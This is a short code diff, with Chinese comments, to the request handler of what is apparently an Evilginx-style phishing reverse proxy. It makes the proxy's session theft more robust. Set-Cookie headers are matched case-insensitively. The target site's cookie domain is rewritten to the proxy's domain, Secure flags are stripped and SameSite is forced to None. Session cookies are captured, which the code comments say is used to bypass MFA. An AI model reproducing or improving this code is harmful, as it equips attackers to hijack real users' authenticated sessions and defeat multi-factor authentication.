@@ -159,11 +159,10 @@ def make_handler(phishlet, db_file):
                 body = text.encode()
 
             # Set-Cookie 域重写(目标的 cookie 种到我们的域)
-            if 'Set-Cookie' in headers or 'set-cookie' in headers:
+            if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
                 raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                 if isinstance(raw, str):
-                    raw = raw.replace(f'domain={target_host}', f'domain={proxy_host}')
-                    raw = raw.replace(f'Domain={target_host}', f'Domain={proxy_host}')
+                    raw = re.sub(r'(?i)(domain=)' + re.escape(target_host), r'\g<1>' + proxy_host, raw)  # CS73-F4: 属性替换大小写不敏感
                     raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                     raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
                     headers['Set-Cookie'] = raw
@@ -171,7 +170,7 @@ def make_handler(phishlet, db_file):
 
         def check_session_capture(self, headers):
             """检测目标响应里的 session cookie(Evilginx 核心: 拿 cookie 绕 MFA)"""
-            raw = headers.get('Set-Cookie', headers.get('set-cookie', ''))
+            raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS73-F4
             if not raw:
                 return None
             captured = {}
